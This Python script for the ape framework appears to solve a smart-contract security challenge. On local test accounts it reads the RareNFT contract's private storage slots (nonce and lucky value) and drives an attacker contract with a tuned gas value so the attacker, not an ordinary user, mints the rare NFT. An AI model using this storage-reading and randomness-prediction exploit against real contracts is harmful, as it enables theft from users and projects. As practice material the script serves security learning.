from ape import accounts, project
from .utils.helper import w3, get_storage

ONE_ETHER = w3.to_wei(1, "ether")


def deploy(deployer):

    # deploy NFT
    print("\n--- Deploying Rare NFT ---\n")
    rare = project.RareNFT.deploy(value=ONE_ETHER, sender=deployer)

    return rare


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]
    user = accounts.test_accounts[2]

    # get NFT contract
    rare = deploy(deployer)

    print(f"\n--- RareNFT Contract: {rare}---\n")

    nonce = int(get_storage(rare.address, 3), 0)
    lucky_val = int(get_storage(rare.address, 4), 0)

    print(f"\n--- Lucky Val set by the contract: {lucky_val} ---\n")

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.RareNFTAttacker.deploy(
        rare.address,
        sender=attacker,
        value="1 ether",
    )
    gas_left = 29413721  # found via testing different values
    attacker_contract.attack(lucky_val, nonce, gas_left, sender=attacker)
    print(f"\n--- Attacker's NFT: {rare.tokenInfo(nonce)}---\n")

    # user mints an NFT but they aren't as lucky
    rare.mint(32, value="1 ether", sender=user)
    print(f"\n--- User's NFT: {rare.tokenInfo(nonce+1)}---\n")

    # --- AFTER EXPLOIT --- #

    assert (
        rare.tokenInfo(nonce).owner == attacker_contract.address
        and rare.tokenInfo(nonce).rare
    )
    assert (
        rare.tokenInfo(nonce + 1).owner == user.address
        and not rare.tokenInfo(nonce + 1).rare
    )

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
